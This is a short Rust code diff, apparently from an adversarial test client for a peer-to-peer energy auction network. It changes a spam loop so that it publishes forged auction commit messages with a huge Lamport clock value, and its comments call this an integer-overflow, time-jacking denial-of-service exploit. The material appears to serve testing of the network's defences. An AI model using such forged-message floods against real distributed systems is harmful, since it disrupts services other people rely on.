@@ -51,13 +51,17 @@ async fn main() -> Result<(), Box<dyn Error>> {
     loop {
         tokio::select! {
             _ = spam_interval.tick() => {
-                // Create a JSON that is structurally valid, but from an unauthorized peer
-                let fake_json = format!(r#"{{"Commit":{{"auction_id":"ENERGY_AUCTION_001","lamport_clock":999,"bidder_id":"{}","commitment":"fake_hex"}}}}"#, local_peer_id);
+                // THE EXPLOIT: We inject an impossibly high Lamport Clock value
+                // to try and cause an Integer Overflow DoS attack on the network.
+                let fake_json = format!(
+                    r#"{{"Commit":{{"auction_id":"ENERGY_AUCTION_001","lamport_clock":999999999,"bidder_id":"{}","commitment":"fake_hex"}}}}"#, 
+                    local_peer_id
+                );
                 let _ = swarm.behaviour_mut().gossipsub.publish(topic.clone(), fake_json.as_bytes());
             }
             event = swarm.select_next_some() => {
                 if let SwarmEvent::ConnectionEstablished { .. } = event {
-                    println!("💣 CONNECTION SECURED! COMMENCING SPAM ATTACK!");
+                    println!("💣 CONNECTION SECURED! FIRING TIME-JACKING EXPLOIT!");
                 } else if let SwarmEvent::ConnectionClosed { .. } = event {
                     println!("❌ CONNECTION LOST! Node A banned our IP!");
                     std::process::exit(0);
